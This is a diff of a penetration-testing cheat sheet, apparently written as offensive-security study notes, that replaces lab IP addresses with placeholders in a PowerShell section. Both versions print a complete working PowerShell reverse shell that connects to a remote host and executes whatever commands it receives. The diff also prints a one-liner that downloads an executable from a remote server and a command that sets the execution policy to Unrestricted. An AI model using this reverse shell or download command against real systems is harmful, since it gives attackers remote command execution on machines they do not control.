@@ -661,19 +661,19 @@ $ socat - OPENSSL:10.11.0.4:443,verify=0                                        
 
 **Misc Commands**
 ```
-Set-ExecutionPolicy Unrestricted                                                                                  Set the PowerShell execution policy
-Get-ExecutionPolicy                                                                                               Get value for ExecutionPolicy
-(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')    Download a file
-powershell -c "command"                                                                                           The -c option will execute the supplied command as if it were typed at the PowerShell prompt
+Set-ExecutionPolicy Unrestricted                                                                        Set the PowerShell execution policy
+Get-ExecutionPolicy                                                                                     Get value for ExecutionPolicy
+(new-object System.Net.WebClient).DownloadFile('http://<IP>/wget.exe','C:\<DIR>\wget.exe')              Download a file
+powershell -c "command"                                                                                 The -c option will execute the supplied command as if it were typed at the PowerShell prompt
 ```
 
 
 **Send a reverse shell with PowerShell**
 - ```
-  powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+  powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
   ```
 - ```
-  $client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
+  $client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);
   $stream = $client.GetStream();
   [byte[]]$bytes = 0..65535|%{0};
   while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
